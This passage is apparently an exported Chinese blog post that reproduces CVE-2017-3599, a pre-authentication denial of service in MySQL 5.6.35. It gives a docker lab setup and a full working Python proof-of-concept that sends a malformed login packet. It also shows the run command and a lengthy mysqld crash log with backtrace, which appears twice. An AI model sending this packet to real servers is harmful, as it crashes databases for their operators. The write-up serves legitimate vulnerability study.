the\n--defaults-file argument to mysqld_safe when starting the server\n\nDatabase initialized\nMySQL init process in progress...\n2023-12-19 12:19:40 0 [Note] mysqld (mysqld 5.6.35) starting as process 87 ...\n2023-12-19 12:19:40 87 [Note] Plugin 'FEDERATED' is disabled.\n2023-12-19 12:19:40 87 [Note] InnoDB: Using atomics to ref count buffer pool pages\n2023-12-19 12:19:40 87 [Note] InnoDB: The InnoDB memory heap is disabled\n2023-12-19 12:19:40 87 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins\n2023-12-19 12:19:40 87 [Note] InnoDB: Memory barrier is not used\n2023-12-19 12:19:40 87 [Note] InnoDB: Compressed tables use zlib 1.2.8\n2023-12-19 12:19:40 87 [Note] InnoDB: Using Linux native AIO\n2023-12-19 12:19:40 87 [Note] InnoDB: Not using CPU crc32 instructions\n2023-12-19 12:19:40 87 [Note] InnoDB: Initializing buffer pool, size = 128.0M\n2023-12-19 12:19:40 87 [Note] InnoDB: Completed initialization of buffer pool\n2023-12-19 12:19:40 87 [Note] InnoDB: Highest supported file format is Barracuda.\n2023-12-19 12:19:40 87 [Note] InnoDB: 128 rollback segment(s) are active.\n2023-12-19 12:19:40 87 [Note] InnoDB: Waiting for purge to start\n2023-12-19 12:19:40 87 [Note] InnoDB: 5.6.35 started; log sequence number 1625987\n2023-12-19 12:19:40 87 [Warning] No existing UUID has been found, so we assume that this is the first time that this server has been started. Generating a new UUID: e27a6a12-9e68-11ee-867c-0242ac110002.\n2023-12-19 12:19:40 87 [Warning] 'user' entry 'root@100bfe039d09' ignored in --skip-name-resolve mode.\n2023-12-19 12:19:40 87 [Warning] 'user' entry '@100bfe039d09' ignored in --skip-name-resolve mode.\n2023-12-19 12:19:40 87 [Warning] 'proxies_priv' entry '@ root@100bfe039d09' ignored in --skip-name-resolve mode.\n2023-12-19 12:19:40 87 [Note] Event Scheduler: Loaded 0 events\n2023-12-19 12:19:40 87 [Note] mysqld: ready for connections.\nVersion: '5.6.35'  socket: '/var/run/mysqld/mysqld.sock'  port: 0  MySQL Community Server (GPL)\nWarning: Unable to load '/usr/share/zoneinfo/iso3166.tab' as time zone. Skipping it.\nWarning: Unable to load '/usr/share/zoneinfo/leap-seconds.list' as time zone. Skipping it.\nWarning: Unable to load '/usr/share/zoneinfo/zone.tab' as time zone. Skipping it.\n2023-12-19 12:19:42 87 [Warning] 'proxies_priv' entry '@ root@100bfe039d09' ignored in --skip-name-resolve mode.\n\n2023-12-19 12:19:42 87 [Note] mysqld: Normal shutdown\n\n2023-12-19 12:19:42 87 [Note] Giving 0 client threads a chance to die gracefully\n2023-12-19 12:19:42 87 [Note] Event Scheduler: Purging the queue. 0 events\n2023-12-19 12:19:42 87 [Note] Shutting down slave threads\n2023-12-19 12:19:42 87 [Note] Forcefully disconnecting 0 remaining clients\n2023-12-19 12:19:42 87 [Note] Binlog end\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'partition'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_SYS_DATAFILES'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_SYS_TABLESPACES'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_SYS_FOREIGN_COLS'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_SYS_FOREIGN'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_SYS_FIELDS'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_SYS_COLUMNS'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_SYS_INDEXES'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_SYS_TABLESTATS'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_SYS_TABLES'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_FT_INDEX_TABLE'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_FT_INDEX_CACHE'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_FT_CONFIG'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_FT_BEING_DELETED'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_FT_DELETED'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_FT_DEFAULT_STOPWORD'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_METRICS'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_BUFFER_POOL_STATS'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_BUFFER_PAGE_LRU'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_BUFFER_PAGE'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_CMP_PER_INDEX_RESET'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_CMP_PER_INDEX'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_CMPMEM_RESET'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_CMPMEM'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_CMP_RESET'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_CMP'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_LOCK_WAITS'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_LOCKS'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_TRX'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'InnoDB'\n2023-12-19 12:19:42 87 [Note] InnoDB: FTS optimize thread exiting.\n2023-12-19 12:19:42 87 [Note] InnoDB: Starting shutdown...\n2023-12-19 12:19:43 87 [Note] InnoDB: Shutdown completed; log sequence number 1625997\n2023-12-19 12:19:43 87 [Note] Shutting down plugin 'BLACKHOLE'\n2023-12-19 12:19:43 87 [Note] Shutting down plugin 'ARCHIVE'\n2023-12-19 12:19:43 87 [Note] Shutting down plugin 'PERFORMANCE_SCHEMA'\n2023-12-19 12:19:43 87 [Note] Shutting down plugin 'MRG_MYISAM'\n2023-12-19 12:19:43 87 [Note] Shutting down plugin 'MyISAM'\n2023-12-19 12:19:43 87 [Note] Shutting down plugin 'CSV'\n2023-12-19 12:19:43 87 [Note] Shutting down plugin 'MEMORY'\n2023-12-19 12:19:43 87 [Note] Shutting down plugin 'sha256_password'\n2023-12-19 12:19:43 87 [Note] Shutting down plugin 'mysql_old_password'\n2023-12-19 12:19:43 87 [Note] Shutting down plugin 'mysql_native_password'\n2023-12-19 12:19:43 87 [Note] Shutting down plugin 'binlog'\n2023-12-19 12:19:43 87 [Note] mysqld: Shutdown complete\n\n\nMySQL init process done. Ready for start up.\n\n2023-12-19 12:19:44 0 [Note] mysqld (mysqld 5.6.35) starting as process 1 ...\n2023-12-19 12:19:44 1 [Note] Plugin 'FEDERATED' is disabled.\n2023-12-19 12:19:44 1 [Note] InnoDB: Using atomics to ref count buffer pool pages\n2023-12-19 12:19:44 1 [Note] InnoDB: The InnoDB memory heap is disabled\n2023-12-19 12:19:44 1 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins\n2023-12-19 12:19:44 1 [Note] InnoDB: Memory barrier is not used\n2023-12-19 12:19:44 1 [Note] InnoDB: Compressed tables use zlib 1.2.8\n2023-12-19 12:19:44 1 [Note] InnoDB: Using Linux native AIO\n2023-12-19 12:19:44 1 [Note] InnoDB: Not using CPU crc32 instructions\n2023-12-19 12:19:44 1 [Note] InnoDB: Initializing buffer pool, size = 128.0M\n2023-12-19 12:19:44 1 [Note] InnoDB: Completed initialization of buffer pool\n2023-12-19 12:19:44 1 [Note] InnoDB: Highest supported file format is Barracuda.\n2023-12-19 12:19:44 1 [Note] InnoDB: 128 rollback segment(s) are active.\n2023-12-19 12:19:44 1 [Note] InnoDB: Waiting for purge to start\n2023-12-19 12:19:44 1 [Note] InnoDB: 5.6.35 started; log sequence number 1625997\n2023-12-19 12:19:44 1 [Note] Server hostname (bind-address): '*'; port: 3306\n2023-12-19 12:19:44 1 [Note] IPv6 is available.\n2023-12-19 12:19:44 1 [Note]   - '::' resolves to '::';\n2023-12-19 12:19:44 1 [Note] Server socket created on IP: '::'.\n2023-12-19 12:19:44 1 [Warning] 'proxies_priv' entry '@ root@100bfe039d09' ignored in --skip-name-resolve mode.\n2023-12-19 12:19:44 1 [Note] Event Scheduler: Loaded 0 events\n2023-12-19 12:19:44 1 [Note] mysqld: ready for connections.\nVersion: '5.6.35'  socket: '/var/run/mysqld/mysqld.sock'  port: 3306  MySQL Community Server (GPL)\n12:21:29 UTC - mysqld got signal 11 ;\nThis could be because you hit a bug. It is also possible that this binary\nor one of the libraries it was linked against is corrupt, improperly built,\nor misconfigured. This error can also be caused by malfunctioning hardware.\nWe will try our best to scrape up some info that will hopefully help\ndiagnose the problem, but since we have already crashed, \nsomething is definitely wrong and this may fail.\n\nkey_buffer_size=8388608\nread_buffer_size=131072\nmax_used_connections=1\nmax_threads=151\nthread_count=1\nconnection_count=1\nIt is possible that mysqld could use up to \nkey_buffer_size + (read_buffer_size + sort_buffer_size)*max_threads = 68108 K  bytes of memory\nHope that's ok; if not, decrease some variables in the equation.\n\nThread pointer: 0x23d86c0\nAttempting backtrace. You can use the following information to find out\nwhere mysqld died. If you see no messages after this, something went\nterribly wrong...\nstack_bottom = 7f3ca45a1e98 thread_stack 0x40000\nmysqld(my_print_stacktrace+0x2c)[0x8c3d5c]\nmysqld(handle_fatal_signal+0x481)[0x661df1]\n/lib/x86_64-linux-gnu/libpthread.so.0(+0xf890)[0x7f3ccee40890]\n/lib/x86_64-linux-gnu/libc.so.6(memchr+0x78)[0x7f3ccd885cd8]\nmysqld[0x672dc4]\nmysqld[0x683e2d]\nmysqld[0x68433e]\nmysqld[0x6730a9]\nmysqld[0x6724df]\nmysqld(_Z16acl_authenticateP3THDj+0x1bd)[0x68450d]\nmysqld[0x6abe17]\nmysqld(_Z16login_connectionP3THD+0x42)[0x6acbe2]\nmysqld(_Z22thd_prepare_connectionP3THD+0x19)[0x6ad329]\nmysqld(_Z24do_handle_one_connectionP3THD+0x11c)[0x6ad49c]\nmysqld(handle_one_connection+0x40)[0x6ad570]\nmysqld(pfs_spawn_thread+0x146)[0x8fa106]\n/lib/x86_64-linux-gnu/libpthread.so.0(+0x8064)[0x7f3ccee39064]\n/lib/x86_64-linux-gnu/libc.so.6(clone+0x6d)[0x7f3ccd8e962d]\n\nTrying to get some variables.\nSome pointers may be invalid and cause the dump to abort.\nQuery (0): Connection ID (thread ID): 1\nStatus: NOT_KILLED\n\nThe manual page at http://dev.mysql.com/doc/mysql/en/crashing.html contains\ninformation that should help you find out what is causing the crash.\n```","source":"_posts/CVE-2017-3599漏洞复现.md","raw":"---\ntitle: CVE-2017-3599漏洞复现\ndate: 2024-01-14 21:44:55\ntags:\n    - CVE-2017-3599\ncategories:\n    - 漏洞复现\n---\n\n## 参考链接\n\n[MySQL < 5.6.35 / < 5.7.17 - Integer Overflow - Multiple dos Exploit](https://www.exploit-db.com/exploits/41954)\n\n## 漏洞说明\n\n> Vulnerability in the MySQL Server component of Oracle MySQL (subcomponent: Server: Pluggable Auth). Supported versions that are affected are 5.6.35 and earlier and 5.7.17 and earlier. Easily “exploitable” vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise MySQL Server. Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL Server. CVSS 3.0 Base Score 7.5 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H). NOTE: the previous information is from the April 2017 CPU. Oracle has not commented on third-party claims that this issue is an integer overflow in sql/auth/sql_authentication.cc which allows remote attackers to cause a denial of service via a crafted authentication packet.\n\n## 被测环境\n\n- docker镜像：`mysql:5.6.35`\n- 启动被测环境容器：`docker run -d -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 pmysql:5.6.35`\n\n## POC脚本\n\n```python\n# python2.7\n\n'''\n# Source: https://raw.githubusercontent.com/SECFORCE/CVE-2017-3599/master/cve-2017-3599_poc.py\n# Exploit Title: Remote MySQL DOS (Integer Overflow)\n# Google Dork: N/A\n# Date: 13th April 2017\n# Exploit Author: Rodrigo Marcos\n# Vendor Homepage: https://www.mysql.com/\n# Software Link: https://www.mysql.com/downloads/\n# Version: 5.6.35 and below / 5.7.17 and below\n# Tested on: N/A\n# CVE : CVE-2017-3599\n'''\n\nimport socket \nimport sys\nfrom struct import pack\n\n'''\nCVE-2017-3599 Proof of Concept exploit code.\n\nhttps://www.secforce.com/blog/2017/04/cve-2017-3599-pre-auth-mysql-remote-dos/\n\nRodrigo Marcos\n\n'''\n\nif len(sys.argv)<2:\n\n    print \"Usage: python \" + sys.argv[0] + \" host [port]\"\n    exit(0)\n\nelse:\n    HOST = sys.argv[1]\n\n    if len(sys.argv)>2:\n        PORT = int(sys.argv[2]) # Yes, no error checking... living on the wild side!\n    else:\n        PORT = 3306\n\nprint \"[+] Creating packet...\"\n\n'''\n3 bytes\t\tPacket lenth\n1 bytes \tPacket number\n\nLogin request:\n\nPacket format (when the server is 4.1 or newer):\n\nBytes       Content\n-----       ----\n4           client capabilities\n4           max packet size\n1           charset number\n23          reserved (always 0)\nn           user name, \\0-terminated\nn           plugin auth data (e.g. scramble), length encoded\nn           database name, \\0-terminated\n            (if CLIENT_CONNECT_WITH_DB is set in the capabilities)\nn           client auth plugin name - \\0-terminated string,\n            (if CLIENT_PLUGIN_AUTH is set in the capabilities)\n\n'''\n\n# packet_len = '\\x64\\x00\\x00'\n\npacket_num = '\\x01'\n\n#Login request packet\npacket_cap = '\\x85\\xa2\\xbf\\x01'\t\t# client capabilities (default)\npacket_max = '\\x00\\x00\\x00\\x01'\t\t# max packet size (default)\npacket_cset = '\\x21'\t\t\t\t# charset (default)\np_reserved = '\\x00' * 23 \t\t\t# 23 bytes reserved with nulls (default)\npacket_usr =  'test\\x00' \t\t\t# username null terminated (default)\n\npacket_auth  = '\\xff'\t\t\t# both \\xff and \\xfe crash the server\n\n'''\nConditions to crash:\n\n1 - packet_auth must start with \\xff or \\xfe\n2 - packet_auth must be shorter than 8 chars\n\nThe expected value is the password, which could be of two different formats\n(null terminated or length encoded) depending on the client functionality.\n'''\n\npacket = packet_cap + packet_max + packet_cset + p_reserved + packet_usr + packet_auth \npacket_len = pack('i',len(packet))[:3]\n\nrequest = packet_len + packet_num + packet\n\nprint \"[+] Connecting to host...\"\ntry:\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((HOST, PORT))\n    print \"[+] Connected.\"\n\nexcept:\n    print \"[+] Unable to connect to host \" + HOST + \" on port \" + str(PORT) + \".\"\t\n    s.close()\n    print \"[+] Exiting.\"\n    exit(0)\n\nprint \"[+] Receiving greeting from remote host...\"\ndata = s.recv(1024)\nprint \"[+] Done.\"\n\nprint \"[+] Sending our payload...\"\ns.send(request)\nprint \"[+] Done.\"\n#print \"Our data: %r\" % request\n\ns.close()\n```\n\n## 攻击执行\n\n```sh\npython poc.py IP 3306\n```\n\n## 攻击效果\n\n```sh\n拒绝服务，查看数据库的容器日志：\n\nroot@yml-penetration:~/Workspace/cve-2017-3599# docker logs 100\nInitializing database\n2023-12-19 12:19:33 0 [Note] Ignoring --secure-file-priv value as server is running with --bootstrap.\n2023-12-19 12:19:33 0 [Note] /usr/sbin/mysqld (mysqld 5.6.35) starting as process 36 ...\n2023-12-19 12:19:33 36 [Note] InnoDB: Using atomics to ref count buffer pool pages\n2023-12-19 12:19:33 36 [Note] InnoDB: The InnoDB memory heap is disabled\n2023-12-19 12:19:33 36 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins\n2023-12-19 12:19:33 36 [Note] InnoDB: Memory barrier is not used\n2023-12-19 12:19:33 36 [Note] InnoDB: Compressed tables use zlib 1.2.8\n2023-12-19 12:19:33 36 [Note] InnoDB: Using Linux native AIO\n2023-12-19 12:19:33 36 [Note] InnoDB: Not using CPU crc32 instructions\n2023-12-19 12:19:33 36 [Note] InnoDB: Initializing buffer pool, size = 128.0M\n2023-12-19 12:19:33 36 [Note] InnoDB: Completed initialization of buffer pool\n2023-12-19 12:19:33 36 [Note] InnoDB: The first specified data file ./ibdata1 did not exist: a new database to be created!\n2023-12-19 12:19:33 36 [Note] InnoDB: Setting file ./ibdata1 size to 12 MB\n2023-12-19 12:19:33 36 [Note] InnoDB: Database physically writes the file full: wait...\n2023-12-19 12:19:33 36 [Note] InnoDB: Setting log file ./ib_logfile101 size to 48 MB\n2023-12-19 12:19:33 36 [Note] InnoDB: Setting log file ./ib_logfile1 size to 48 MB\n2023-12-19 12:19:34 36 [Note] InnoDB: Renaming log file ./ib_logfile101 to ./ib_logfile0\n2023-12-19 12:19:34 36 [Warning] InnoDB: New log files created, LSN=45781\n2023-12-19 12:19:34 36 [Note] InnoDB: Doublewrite buffer not found: creating new\n2023-12-19 12:19:34 36 [Note] InnoDB: Doublewrite buffer created\n2023-12-19 12:19:34 36 [Note] InnoDB: 128 rollback segment(s) are active.\n2023-12-19 12:19:34 36 [Warning] InnoDB: Creating foreign key constraint system tables.\n2023-12-19 12:19:34 36 [Note] InnoDB: Foreign key constraint system tables created\n2023-12-19 12:19:34 36 [Note] InnoDB: Creating tablespace and datafile system tables.\n2023-12-19 12:19:34 36 [Note] InnoDB: Tablespace and datafile system tables created.\n2023-12-19 12:19:34 36 [Note] InnoDB: Waiting for purge to start\n2023-12-19 12:19:34 36 [Note] InnoDB: 5.6.35 started; log sequence number 0\n2023-12-19 12:19:36 36 [Note] Binlog end\n2023-12-19 12:19:36 36 [Note] InnoDB: FTS optimize thread exiting.\n2023-12-19 12:19:36 36 [Note] InnoDB: Starting shutdown...\n2023-12-19 12:19:38 36 [Note] InnoDB: Shutdown completed; log sequence number 1625977\n\n\n2023-12-19 12:19:38 0 [Note] Ignoring --secure-file-priv value as server is running with --bootstrap.\n2023-12-19 12:19:38 0 [Note] /usr/sbin/mysqld (mysqld 5.6.35) starting as process 59 ...\n2023-12-19 12:19:38 59 [Note] InnoDB: Using atomics to ref count buffer pool pages\n2023-12-19 12:19:38 59 [Note] InnoDB: The InnoDB memory heap is disabled\n2023-12-19 12:19:38 59 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins\n2023-12-19 12:19:38 59 [Note] InnoDB: Memory barrier is not used\n2023-12-19 12:19:38 59 [Note] InnoDB: Compressed tables use zlib 1.2.8\n2023-12-19 12:19:38 59 [Note] InnoDB: Using Linux native AIO\n2023-12-19 12:19:38 59 [Note] InnoDB: Not using CPU crc32 instructions\n2023-12-19 12:19:38 59 [Note] InnoDB: Initializing buffer pool, size = 128.0M\n2023-12-19 12:19:38 59 [Note] InnoDB: Completed initialization of buffer pool\n2023-12-19 12:19:38 59 [Note] InnoDB: Highest supported file format is Barracuda.\n2023-12-19 12:19:38 59 [Note] InnoDB: 128 rollback segment(s) are active.\n2023-12-19 12:19:38 59 [Note] InnoDB: Waiting for purge to start\n2023-12-19 12:19:38 59 [Note] InnoDB: 5.6.35 started; log sequence number 1625977\n2023-12-19 12:19:38 59 [Note] Binlog end\n2023-12-19 12:19:38 59 [Note] InnoDB: FTS optimize thread exiting.\n2023-12-19 12:19:38 59 [Note] InnoDB: Starting shutdown...\n2023-12-19 12:19:40 59 [Note] InnoDB: Shutdown completed; log sequence number 1625987\n\n\n\n\nPLEASE REMEMBER TO SET A PASSWORD FOR THE MySQL root USER !\nTo do so, start the server, then issue the following commands:\n\n/usr/bin/mysqladmin -u root password 'new-password'\n/usr/bin/mysqladmin -u root -h 100bfe039d09 password 'new-password'\n\nAlternatively you can run:\n\n/usr/bin/mysql_secure_installation\n\nwhich will also give you the option of removing the test\ndatabases and anonymous user created by default.  This is\nstrongly recommended for production servers.\n\nSee the manual for more instructions.\n\nPlease report any problems at http://bugs.mysql.com/\n\nThe latest information about MySQL is available on the web at\n\nhttp://www.mysql.com\n\nSupport MySQL by buying support/licenses at http://shop.mysql.com\n\nNote: new default config file not created.\nPlease make sure your config file is current\n\nWARNING: Default config file /etc/mysql/my.cnf exists on the system\nThis file will be read by default by the MySQL server\nIf you do not want to use this, either remove it, or use the\n--defaults-file argument to mysqld_safe when starting the server\n\nDatabase initialized\nMySQL init process in progress...\n2023-12-19 12:19:40 0 [Note] mysqld (mysqld 5.6.35) starting as process 87 ...\n2023-12-19 12:19:40 87 [Note] Plugin 'FEDERATED' is disabled.\n2023-12-19 12:19:40 87 [Note] InnoDB: Using atomics to ref count buffer pool pages\n2023-12-19 12:19:40 87 [Note] InnoDB: The InnoDB memory heap is disabled\n2023-12-19 12:19:40 87 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins\n2023-12-19 12:19:40 87 [Note] InnoDB: Memory barrier is not used\n2023-12-19 12:19:40 87 [Note] InnoDB: Compressed tables use zlib 1.2.8\n2023-12-19 12:19:40 87 [Note] InnoDB: Using Linux native AIO\n2023-12-19 12:19:40 87 [Note] InnoDB: Not using CPU crc32 instructions\n2023-12-19 12:19:40 87 [Note] InnoDB: Initializing buffer pool, size = 128.0M\n2023-12-19 12:19:40 87 [Note] InnoDB: Completed initialization of buffer pool\n2023-12-19 12:19:40 87 [Note] InnoDB: Highest supported file format is Barracuda.\n2023-12-19 12:19:40 87 [Note] InnoDB: 128 rollback segment(s) are active.\n2023-12-19 12:19:40 87 [Note] InnoDB: Waiting for purge to start\n2023-12-19 12:19:40 87 [Note] InnoDB: 5.6.35 started; log sequence number 1625987\n2023-12-19 12:19:40 87 [Warning] No existing UUID has been found, so we assume that this is the first time that this server has been started. Generating a new UUID: e27a6a12-9e68-11ee-867c-0242ac110002.\n2023-12-19 12:19:40 87 [Warning] 'user' entry 'root@100bfe039d09' ignored in --skip-name-resolve mode.\n2023-12-19 12:19:40 87 [Warning] 'user' entry '@100bfe039d09' ignored in --skip-name-resolve mode.\n2023-12-19 12:19:40 87 [Warning] 'proxies_priv' entry '@ root@100bfe039d09' ignored in --skip-name-resolve mode.\n2023-12-19 12:19:40 87 [Note] Event Scheduler: Loaded 0 events\n2023-12-19 12:19:40 87 [Note] mysqld: ready for connections.\nVersion: '5.6.35'  socket: '/var/run/mysqld/mysqld.sock'  port: 0  MySQL Community Server (GPL)\nWarning: Unable to load '/usr/share/zoneinfo/iso3166.tab' as time zone. Skipping it.\nWarning: Unable to load '/usr/share/zoneinfo/leap-seconds.list' as time zone. Skipping it.\nWarning: Unable to load '/usr/share/zoneinfo/zone.tab' as time zone. Skipping it.\n2023-12-19 12:19:42 87 [Warning] 'proxies_priv' entry '@ root@100bfe039d09' ignored in --skip-name-resolve mode.\n\n2023-12-19 12:19:42 87 [Note] mysqld: Normal shutdown\n\n2023-12-19 12:19:42 87 [Note] Giving 0 client threads a chance to die gracefully\n2023-12-19 12:19:42 87 [Note] Event Scheduler: Purging the queue. 0 events\n2023-12-19 12:19:42 87 [Note] Shutting down slave threads\n2023-12-19 12:19:42 87 [Note] Forcefully disconnecting 0 remaining clients\n2023-12-19 12:19:42 87 [Note] Binlog end\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'partition'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_SYS_DATAFILES'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_SYS_TABLESPACES'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_SYS_FOREIGN_COLS'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_SYS_FOREIGN'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_SYS_FIELDS'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_SYS_COLUMNS'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_SYS_INDEXES'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_SYS_TABLESTATS'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_SYS_TABLES'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_FT_INDEX_TABLE'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_FT_INDEX_CACHE'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_FT_CONFIG'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_FT_BEING_DELETED'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_FT_DELETED'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_FT_DEFAULT_STOPWORD'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_METRICS'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_BUFFER_POOL_STATS'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_BUFFER_PAGE_LRU'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_BUFFER_PAGE'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_CMP_PER_INDEX_RESET'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_CMP_PER_INDEX'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_CMPMEM_RESET'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_CMPMEM'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_CMP_RESET'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_CMP'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_LOCK_WAITS'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_LOCKS'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'INNODB_TRX'\n2023-12-19 12:19:42 87 [Note] Shutting down plugin 'InnoDB'\n2023-12-19 12:19:42 87 [Note] InnoDB: FTS optimize thread exiting.\n2023-12-19 12:19:42 87 [Note] InnoDB: Starting shutdown...\n2023-12-19 12:19:43 87 [Note] InnoDB: Shutdown completed; log sequence number 1625997\n2023-12-19 12:19:43 87 [Note] Shutting down plugin 'BLACKHOLE'\n2023-12-19 12:19:43 87 [Note] Shutting down plugin 'ARCHIVE'\n2023-12-19 12:19:43 87 [Note] Shutting down plugin 'PERFORMANCE_SCHEMA'\n2023-12-19 12:19:43 87 [Note] Shutting down plugin 'MRG_MYISAM'\n2023-12-19 12:19:43 87 [Note] Shutting down plugin 'MyISAM'\n2023-12-19 12:19:43 87 [Note] Shutting down plugin 'CSV'\n2023-12-19 12:19:43 87 [Note] Shutting down plugin 'MEMORY'\n2023-12-19 12:19:43 87 [Note] Shutting down plugin 'sha256_password'\n2023-12-19 12:19:43 87 [Note] Shutting down plugin 'mysql_old_password'\n2023-12-19 12:19:43 87 [Note] Shutting down plugin 'mysql_native_password'\n2023-12-19 12:19:43 87 [Note] Shutting down plugin 'binlog'\n2023-12-19 12:19:43 87 [Note] mysqld: Shutdown complete\n\n\nMySQL init process done. Ready for start up.\n\n2023-12-19 12:19:44 0 [Note] mysqld (mysqld 5.6.35) starting as process 1 ...\n2023-12-19 12:19:44 1 [Note] Plugin 'FEDERATED' is disabled.\n2023-12-19 12:19:44 1 [Note] InnoDB: Using atomics to ref count buffer pool pages\n2023-12-19 12:19:44 1 [Note] InnoDB: The InnoDB memory heap is disabled\n2023-12-19 12:19:44 1 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins\n2023-12-19 12:19:44 1 [Note] InnoDB: Memory barrier is not used\n2023-12-19 12:19:44 1 [Note] InnoDB: Compressed tables use zlib 1.2.8\n2023-12-19 12:19:44 1 [Note] InnoDB: Using Linux native AIO\n2023-12-19 12:19:44 1 [Note] InnoDB: Not using CPU crc32 instructions\n2023-12-19 12:19:44 1 [Note] InnoDB: Initializing buffer pool, size = 128.0M\n2023-12-19 12:19:44 1 [Note] InnoDB: Completed initialization of buffer pool\n2023-12-19 12:19:44 1 [Note] InnoDB: Highest supported file format is Barracuda.\n2023-12-19 12:19:44 1 [Note] InnoDB: 128 rollback segment(s) are active.\n2023-12-19 12:19:44 1 [Note] InnoDB: Waiting for purge to start\n2023-12-19 12:19:44 1 [Note] InnoDB: 5.6.35 started; log sequence number 1625997\n2023-12-19 12:19:44 1 [Note] Server hostname (bind-address): '*'; port: 3306\n2023-12-19 12:19:44 1 [Note] IPv6 is available.\n2023-12-19 12:19:44 1 [Note]   - '::' resolves to '::';\n2023-12-19 12:19:44 1 [Note] Server socket created on IP: '::'.\n2023-12-19 12:19:44 1 [Warning] 'proxies_priv' entry '@ root@100bfe039d09' ignored in --skip-name-resolve mode.\n2023-12-19 12:19:44 1 [Note] Event Scheduler: Loaded 0 events\n2023-12-19 12:19:44 1 [Note] mysqld: ready for connections.\nVersion: '5.6.35'  socket: '/var/run/mysqld/mysqld.sock'  port: 3306  MySQL Community Server (GPL)\n12:21:29 UTC - mysqld got signal 11 ;\nThis could be because you hit a bug. It is also possible that this binary\nor one of the libraries it was linked against is corrupt, improperly built,\nor misconfigured. This error can also be caused by malfunctioning hardware.\nWe will try our best to scrape up some info that will hopefully help\ndiagnose the problem, but since we have already crashed, \nsomething is definitely wrong and this may fail.\n\nkey_buffer_size=8388608\nread_buffer_size=131072\nmax_used_connections=1\nmax_threads=151\nthread_count=1\nconnection_count=1\nIt is possible that mysqld could use up to \nkey_buffer_size + (read_buffer_size + sort_buffer_size)*max_threads = 68108 K  bytes of memory\nHope that's ok; if not, decrease some variables in the equation.\n\nThread pointer: 0x23d86c0\nAttempting backtrace. You can use the following information to find out\nwhere mysqld died. If you see no messages after this, something went\nterribly wrong...\nstack_bottom = 